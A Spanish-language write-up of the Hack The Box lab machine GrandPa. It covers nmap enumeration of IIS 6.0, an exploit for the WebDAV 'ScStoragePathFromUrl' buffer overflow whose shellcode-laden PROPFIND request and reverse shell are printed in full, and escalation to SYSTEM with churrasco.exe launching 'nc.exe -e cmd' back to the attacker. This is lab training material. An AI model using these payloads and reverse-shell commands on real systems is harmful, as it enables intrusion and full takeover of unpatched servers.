---
layout: single
title: GrandPa - Hack The Box
excerpt: "La maquina GrandPa nos vuelve a enseñar lo importante que es enumerar versiones de los servicios, gracias a ello conseguiremos encontrar un BOF que nos conseguirá acceso al sistema, y luego la escalada como la mayoria de maquinas tendremos que identificar un privilegio y jugar con churrasquito"
date: 2021-07-16
classes: wide
header:
  teaser: /assets/images/GrandPa/Untitled.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  -   Web
  -   IIS
  -   BOF
  -   Churrasco
---

# GrandPa

<div>
<p style = 'text-align:center;'>
<img src="https://ethicalhacs.com/wp-content/uploads/2020/10/Grandpa-Hackthebox-walkthough.png" alt="" width="600px">
</p>
</div>

<div>
<p style = 'text-align:center;'>
<img src="https://0xdf.gitlab.io/img/grandpa-radar.webp" alt="" width="250px">
</p>
</div>

Hoy voy a estar resolviendo la maquina GrandPa, es una maquina windows de dificultad facil.

Comenzamos siempre con la enumeracion de puertos abiertos:

# **ENUMERACION**

```bash
❯ cat scanPorts
# Nmap 7.91 scan initiated Tue Aug 17 11:53:51 2021 as: nmap -sC -sV -p80 -oN scanPorts 10.10.10.14
Nmap scan report for 10.10.10.14
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Date: Tue, 17 Aug 2021 15:58:50 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Solo vemos el puerto 80 abierto, por lo que voy a hacer una enumeracion exhaustiva de su contenido, y despues de perder 1h con algo que me reporto nmap con el script vuln:

```bash
❯ cat scanweb
# Nmap 7.91 scan initiated Tue Aug 17 12:05:50 2021 as: nmap --script vuln -p80 -oN scanweb 10.10.10.14
Nmap scan report for grandpa.htb (10.10.10.14)
Host is up (0.055s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /postinfo.html: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /_vti_bin/shtml.dll: Frontpage file or folder
|_  /_vti_bin/shtml.exe: Frontpage file or folder
| http-frontpage-login: 
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
|       
|     References:
|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
```

Me puse a investigar acerca de lo que nos reporta: Frontpage extension anonymous login, pero despues de perder bastante tiempo decidi ir por otro lado, y buscando exploits sobre IIS 6.0 encuentro esto:

# **EXPLOTACION**

```bash
❯ searchsploit IIS 6.0
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                                                                                         | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                                                                                                  | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                                                                                                    | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                                                                                             | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                                                                                                   | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                                                                 | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                                                                                                                  | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                                                                                              | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                                                                                              | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                                                                                          | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                                                                 | windows/remote/19033.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Un Remote Buffer Overflow, yo creo que a nadie le gusta programar su propio BOF asi que vamos a probar ese mismo. Pero hay un problema, ese script lo que hace es lanzar una calc.exe y yo creo que nadie que este leyendo esto quiere probocar que se abra una calc.exe en la maquina, buscando por google encuentro otro script en python que nos ejecuta una rev.shell hacia nuestro sistema, eso ya si mola mas eh. 

```bash
❯ python iis6\ reverse\ shell 10.10.10.14 80 10.10.16.198 443
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.198] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>
```

Tenemos shell ( ✪ワ✪)ノ ʸᵉᵃʰ ᵎ , pero no podemos visualizar la flag, asi que pasamos a la fase de escalacion de privilegios.

# **ESCALACIÓN DE PRIVILEGIOS**

Como de costumbre vemos los privilegios de nuestro usuario actual:

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

Vaya vaya (¬ ‿¬) como huele a patata caliente, como podemos ver SeImpersonatePrivilege esta activado, por lo que la escalada es bastante sencilla, tiramos de JuicyPotato.exe y listo, pero tenemos que ver antes que sistema operativo se esta usando:

```bash
systeminfo                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                           
Host Name:                 GRANPA                                                                                                                                                                                                          
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition                                                                                                                                                           
OS Version:                5.2.3790 Service Pack 2 Build 3790                                                                                                                                                                              
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 15 Minutes, 58 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
```

Esta usando un sistema operativo de 32bits y ademas es un Windows(R) Server 2003, por lo que es bastante antiguo, y en este tipo de sistemas es mejor tirar de churrasco.exe 

Nos compartimos el directorio de trabajo con la herramienta de impacket y nos copiamos el archivo y el nc.exe para otorgarnos una reverse shell:

```bash
❯ impacket-smbserver share .
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
net use \\10.10.16.198\share                                                                                                                                                                                                               
The command completed successfully.
copy \\10.10.16.198\share\churrasco.exe
        1 file(s) copied.
copy \\10.10.16.198\share\nc.exe
        1 file(s) copied.
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\WINDOWS\Temp

08/17/2021  09:28 PM    <DIR>          .
08/17/2021  09:28 PM    <DIR>          ..
08/17/2021  08:41 PM            31,232 churrasco.exe
08/17/2021  08:42 PM            59,392 nc.exe
```

Ahora con churrasco podemos ejecutar nc.exe con privilegios de administrador:

```bash
churrasco.exe -d "C:\Windows\Temp\nc.exe -e cmd 10.10.16.198 443"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 684 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 688 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 692 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 700 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!

C:\WINDOWS\Temp>
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.198] from (UNKNOWN) [10.10.10.14] 1036
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

whoami && hostname
nt authority\system
granpa

C:\WINDOWS\TEMP>
```